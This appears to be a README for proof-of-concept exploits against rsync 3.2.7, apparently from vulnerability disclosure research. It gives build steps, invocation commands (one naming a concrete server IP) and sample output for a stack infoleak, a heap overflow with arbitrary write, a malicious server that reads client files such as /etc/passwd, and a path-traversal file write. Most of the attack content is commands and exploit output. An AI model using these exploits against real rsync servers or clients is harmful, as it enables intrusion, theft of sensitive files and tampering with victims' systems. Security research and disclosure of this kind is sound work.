# Building

Please install `go` with version `1.23`.

```
make all
```

# Other notes

The Infoleak targets binary 3.2.7 on Debian 12. The binary hash is
sha256sum ab0311a3e8e417aa2f0fd5727f6f5d03c1aedf562a386de03e72faef1e90c1e2



# Infoleak PoC

This PoC demonstrates the infoleak technique we used. To execute it,
point at an Rsync server in the first argument with a valid module that
needs to have at least one file in it

```
./poc_infoleak rsync://34.65.52.235:12000/files
```

The output should be similar to:

```
[*] Connecting to rsync://x.x.x.x:12000/files
[*] Connected to rsync://x.x.x.x:12000/files
[*] Targeting file 'foo.txt'
[+] Downloaded target file 'foo.txt' with index 1 with size 9 (48d202349fd7dd73)
[+] Leaked byte 47 from stack
[+] Leaked byte 68 from stack
[+] Leaked byte 12 from stack
[+] Leaked byte fd from stack
[+] Leaked byte 64 from stack
[+] Leaked byte 55 from stack
[+] Leaked byte 0 from stack
[+] Leaked byte 0 from stack
[+] Leaked ptr: 0x5564fd126847
[+] Text Base: 0x5564fd0e4000
```

# Heap Buffer Overflow PoC

This Proof of Concept is a version of the Heap Buffer Overflow that triggers
an arbitrary memory write on address 0x4141414141414141. The PoC will crash
with `0` being written to the address as some data is written before the actual
arbitrary contents are written to the target address.

```
./poc_overflow rsync://<host>:<port>/<module>
```


# File Read PoC

This PoC demonstrates a malicious server's ability to read arbitrary file from
a connecting clients machine. It is a rudimentary script that should work in any
configuration and invocation mode (flag configurations). However, since the PoC
is basic, it needs a few flags enabled to work.

## Starting the malicious server

Example:

```
./poc_fileread --port=8080 --target=/etc/passwd --size=10
```

`--target` is the file that should be leaked by the server. `--size` is the
number of bytes to leak from the file

## Connecting to the server

Use the following flags:

```
rsync -rl rsync://localhost:8080/foo /tmp/
```

Expected output on the server's stdout:

```
Listening on port 8080
Connection from: [::1]:56096
[+] Sending file entry: 2560 files
[+] Starting to leak /etc/passwd
[+] Leaked: 72
[+] Leaked: 6f
[+] Leaked: 6f
[+] Leaked: 74
[+] Leaked: 3a
[+] Leaked: 78
[+] Leaked: 3a
[+] Leaked: 30
[+] Leaked: 3a
[+] Leaked: 30
[+] Leaked 10 bytes from /etc/passwd

---
root:x:0:0
```

# File Write PoC

The server expects one positional argument in the structure of:

`sourceFile:targetFilePath`

`sourceFile` is a local file with any content, e.g. `echo foo > /tmp/foo`. This file is read by the server and the contents will be created as part of the PoC outside of the destination directory.

`targetFilePath` is the path where on the disk to create the malicious file.

Example:

```
./poc_filewrite /tmp/foo:/tmp/poc_write
```

## Connecting to the malicious server

Example:

```
# make sure the file doesn't exist
rm /tmp/poc_write

# clean this directory before each invocation
rm -rf /tmp/destination; mkdir /tmp/destination
rsync -rl rsync://localhost:1337/foo /tmp/destination

# after the invocation
cat /tmp/poc_write
```



